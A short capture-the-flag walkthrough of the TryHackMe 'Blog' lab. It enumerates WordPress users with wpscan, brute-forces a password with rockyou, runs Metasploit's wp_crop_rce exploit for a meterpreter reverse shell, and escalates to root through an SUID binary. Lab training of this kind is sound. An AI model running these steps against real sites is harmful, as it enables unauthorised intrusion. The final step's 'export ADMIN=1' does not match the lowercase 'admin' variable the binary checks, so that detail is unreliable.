
# blog
- Billy Joel made a Wordpress blog!
- https://tryhackme.com/room/blog

as this is a wordpress site use wpscan to enumerate the wordpress install:
```bash
wpscan --url http://10.10.243.226:80 -e -t 60

# first you find it is outdated:
WordPress version 5.0 identified (Insecure, released on 2018-12-06)

# and that it runs the twentytwenty theme
[+] WordPress theme in use: twentytwenty
| Location: http://blog.thm/wp-content/themes/twentytwenty/
| Last Updated: 2023-11-07T00:00:00.000Z
| Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
| [!] The version is out of date, the latest version is 2.4
| Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
| Style Name: Twenty Twenty
| Style URI: https://wordpress.org/themes/twentytwenty/
| Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
| Author: the WordPress team
| Author URI: https://wordpress.org/
|
| Found By: Css Style In Homepage (Passive Detection)
| Confirmed By: Css Style In 404 Page (Passive Detection)
|
| Version: 1.3 (80% confidence)
| Found By: Style (Passive Detection)
|  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'


# furthermore there are 2 users found:
[+] bjoel
| Found By: Wp Json Api (Aggressive Detection)
|  - http://10.10.243.226/wp-json/wp/v2/users/?per_page=100&page=1
| Confirmed By:
|  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
|  Login Error Messages (Aggressive Detection)

[+] kwheel
| Found By: Wp Json Api (Aggressive Detection)
|  - http://10.10.243.226/wp-json/wp/v2/users/?per_page=100&page=1
| Confirmed By:
|  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
|  Login Error Messages (Aggressive Detection)

```

again using wpscan, you can bruteforce the password for kwheel:
```bash
wpscan --url http://blog.thm --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel -t 60
```

```bash
# with access to the admin panel you can run an exploit, which exploits the image upload feature of wordpress on installs <= 5.0.0. It 
# https://nvd.nist.gov/vuln/detail/CVE-2019-8942
# https://nvd.nist.gov/vuln/detail/CVE-2019-8943

msfconsole
use exploit/multi/http/wp_crop_rce
# then set the values and run

```
after the exploit you have an meterpreter reverse shell:
```bash
# running (linpeas)[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS], you find an executable with an SUID flag set 
-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker
/usr/sbin/checker
# analyze the binary with ltrace:
ltrace /usr/sbin/checker
getenv("admin")                                  = nil  # here the binary checks if the admin environment variable is set
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++

# set the admin environment variable, run it again and get a root shell
export ADMIN=1  

# the user.txt flag is found in /media/usb
# the root.txt flag is found in /root
```

